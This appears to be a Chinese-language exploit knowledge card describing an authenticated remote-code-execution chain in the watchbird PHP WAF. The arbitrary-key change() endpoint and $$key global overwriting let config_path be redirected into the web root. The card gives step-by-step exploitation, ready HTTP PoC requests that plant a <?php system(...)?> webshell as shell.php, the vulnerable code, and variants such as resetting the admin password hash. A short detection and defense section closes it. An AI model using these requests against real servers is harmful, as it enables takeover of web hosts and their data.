---
id: web-php-rce-watchbird-config-change-config-path-overwrite-webshell
title: watchbird 后台 change() 任意键值写入：config_path 经 $$key 覆盖后任意文件写入 Web 根 RCE
type: scenario
domain: web
path: web/php/rce
technique: watchbird-config-change-config-path-overwrite-rce
aliases:
- watchbird 后台 RCE
- awd-watchbird config_path 覆盖
- configmanager change 任意配置
- 序列化配置写 webshell
- $$key 覆盖 config_path
tags:
- web
- php
- rce
- waf
- rasp
- awd
- config
- variable-variables
- file-write
- webshell
affected_versions: 除最新版外（原文：两周前发布的新版本中此漏洞已修复）
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V303
  verified_at: '2026-11-08T12:15:37+08:00'
  notes: 已对照原文与图01/10/18-27核对：change 分支仅校验 SESSION login、change() 的 $this->$key/$val 无校验+file_put_contents(serialize)、启动时 foreach get_object_vars 的 $$key 覆盖、config_path 两次 change 写入 Web 根、key=<?php system("dir");?> 写入 shell.php 执行均与原文一致；affected_versions 按原文『最新版已修复』标记。未在本机执行 PoC
---

## 一句话结论

watchbird 控制台的配置接口 `?watchbird=change&key=<属性名>&value=<值>` 对键值不做任何校验，而程序启动时会把反序列化配置对象的每个属性用 `$$key = $val` 写进全局；已登录攻击者先新增 `config_path` 属性把配置写入路径改成 Web 根下的 `shell.php`，再把 PHP 代码塞进任意属性名，最终由 `file_put_contents($config_path, serialize($this))` 写出一个可执行的 PHP webshell。

## 原理

- **watchbird 用什么存配置**：它是无数据库的 PHP WAF/RASP，配置类 `configmanager` 的属性（`flag_path`、`password_sha1`、`open_basedir`、各 `waf_*` 开关、`remote_ip`、过滤规则等）整体 `serialize()` 后写入 `/tmp/watchbird/watchbird.conf`；每次请求重新反序列化。
- **change() 的写入逻辑**：配置类方法 `change($key, $val)` 执行 `global $config_path; $this->$key = $val; ... file_put_contents($config_path, serialize($this));`。`$key`/$val 直接来自 `$_GET['key']`/`$_GET['value']`，没有白名单；调用分支只要求 `$_SESSION['login'] === 'success'`。
- **启动时的变量覆盖**：入口在反序列化配置后执行
  `foreach (get_object_vars($config) as $key => $val) { $$key = $val; }`，
  把配置对象的每个属性名当作变量名写入全局作用域。因此只要配置文件里存在 `config_path` 属性，全局 `$config_path` 就被攻击者控制。
- **为什么能写到 Web 根**：`change()` 里的 `global $config_path` 取到的正是被覆盖后的值。第一次请求把 `config_path` 写进旧的 `/tmp/watchbird/watchbird.conf`；第二次请求启动时读到新值，`file_put_contents` 就把序列化配置写到 Web 根下的 `shell.php`。
- **为什么序列化文件能当 PHP 执行**：PHP 解析器扫描整个文件寻找 `<?php ... ?>` 标签，不要求文件是纯 PHP。攻击者把属性名设为 `<?php system("dir");?>`（值为任意），`serialize()` 输出中会原样包含这段代码；访问 `shell.php` 时 PHP 执行标签内代码，其余序列化文本被当作普通输出。
- **组合结果**：后台任意配置修改 → 全局变量覆盖 → 任意路径文件写入 → 序列化文本夹带 PHP 代码 → Web 根 webshell RCE。
- **进入后台的两种方式**：原文用控制台登录口无限制爆破拿到弱口令（另一种为 XSS 钓鱼）；本文档另有一张卡描述登录爆破绕过自身防 DDoS 的问题。

## 触发条件

- 目标部署了受影响版本的 watchbird（原文：最新版之前，新版本已修复），控制台可访问。
- 攻击者已取得后台会话（弱口令爆破、钓鱼或其它方式），因为 `watchbird=change` 分支要求 `$_SESSION['login']==='success'`。
- PHP 进程对目标 Web 目录有写权限；`config_path` 可指向任意绝对路径且 `file_put_contents` 未被 open_basedir/disable_functions 限制（watchbird 自身默认 `open_basedir='/'`）。
- 目标 Web 服务器会执行被写入的 `.php` 文件（Apache/Nginx+PHP-FPM 均可）。

## 利用步骤

1. 登录 watchbird 控制台，获得有效 `PHPSESSID`。
2. 发送第一次 change，新增/覆盖 `config_path` 为 Web 根下的目标文件：
   `?watchbird=change&key=config_path&value=/var/www/html/shell.php`
   本次仍写入旧路径 `/tmp/watchbird/watchbird.conf`，响应回显 `config_path/var/www/html/shell.php succ`。
3. 再次发送同一请求（或任意 change）：本次启动时已从配置读取 `config_path` 并通过 `$$key` 覆盖全局，配置被写入 `/var/www/html/shell.php`；访问该文件看到的是序列化文本。
4. 发送携带 PHP 代码的 change：
   `?watchbird=change&key=<?php%20system("dir");?>&value=1`
   配置对象新增该属性，序列化后 `<?php system("dir");?>` 原样落入 shell.php。
5. 访问 `/shell.php`，PHP 执行代码并回显目录列表，确认 RCE；后续可替换为文件管理/命令执行等更强载荷。
6. 清理或保持低噪声，记录利用证据。

## PoC

```http
GET /watchbird/?watchbird=change&key=config_path&value=/var/www/html/shell.php HTTP/1.1
Host: target
Cookie: PHPSESSID=<已登录会话>
```

```text
# 第一次：写回 /tmp/watchbird/watchbird.conf，响应
# config_path/var/www/html/shell.php succ
# 第二次（同样请求）：配置被写到 /var/www/html/shell.php
```

```http
GET /watchbird/?watchbird=change&key=<?php%20system("dir");?>&value=1 HTTP/1.1
Host: target
Cookie: PHPSESSID=<已登录会话>
```

```text
# 响应 value=1 succ；随后访问
GET /shell.php
# 页面执行 system("dir") 并回显目录列表（原文在 Windows/phpstudy 环境验证）
```

关键代码形态（原文截图）：

```php
class configmanager {
    public $flag_path = '/flag';
    public $LDPRELOAD_PATH = '/var/www/html/waf.so';
    public $password_sha1 = 'unset';
    // ...
    function change($key, $val) {
        global $config_path;
        $this->$key = $val;
        echo $key; echo $val . "\n";
        if (is_numeric($val)) { $this->$key = intval($val); }
        file_put_contents($config_path, serialize($this));
        die('succ');
    }
}

// 启动时
$config = unserialize(file_get_contents($config_path));
foreach (get_object_vars($config) as $key => $val) {
    $$key = $val;   // 攻击者新增的 config_path 覆盖全局
}
```

## 变体与关联

- 变体：把 PHP 代码放进属性值而不是属性名（`key=任意&value=<?php ...?>`），序列化文本同样会包含 PHP 标签。
- 变体：把 `config_path` 指向 `.htaccess`、模板、计划任务文件等其它可执行/可影响解析的位置；或指向已有可写文件覆盖内容。
- 变体：同一 `change` 接口可把 `password_sha1` 改回 `unset`，使控制台回到“初始化密码”界面，从而重置管理员口令（原文示例）；也可改 `open_basedir`、`waf_*` 开关等配置。
- 关联：[[web-generic-auth-php-variable-variable-config-array-bypass]]——同用 `$$key` 变量变量覆盖，但该卡是从请求参数直接覆盖配置对象绕过鉴权；本卡是从“可写的序列化配置文件”注入 `config_path` 属性覆盖全局，前提与 sink 不同。
- 关联：[[web-php-rce-pbootcms-backend-siteinfo-copy-webshell]]、[[web-php-rce-monitor-log-file-param-shell-write-sudoers-root]]、[[web-php-rce-seacms-admin-ping-post-write-php-code]]——同属后台可控路径/内容写 PHP 文件的 RCE。
- 关联：[[web-generic-auth-rasp-console-login-bruteforce-rate-limit-gap]]——本卡前置的进入后台方式。
- 边界：未登录时 `change` 直接 `die('Credential error')`；Web 目录不可写、`file_put_contents` 被禁用、配置被改为不可反序列化或开启严格 schema 时链条中断。

## 检测与防御

- 检测：`watchbird=change` 请求中出现 `key=config_path`、键名/值含 `<?php`、路径指向 Web 根；同一会话连续两次修改 `config_path`。
- 检测：Web 根新增 `.php` 文件且内容以 `O:<n>:"configmanager"` 之类序列化串开头，内含 PHP 标签；`/tmp/watchbird/watchbird.conf` 中出现非预期属性（尤其 `config_path`）。
- 防御：`change()` 只允许白名单键并做类型/取值校验，禁止任意属性名；`config_path` 固定且不可由配置覆盖，配置写入前做路径边界检查。
- 防御：配置文件移出 Web 根，Web 目录禁止 PHP 写入执行；序列化输出前过滤属性名/值中的 PHP 标签；对配置反序列化使用白名单类与属性。
- 加固：升级到已修复版本；控制台加强口令与登录限流；对配置文件与 Web 目录做完整性监控。
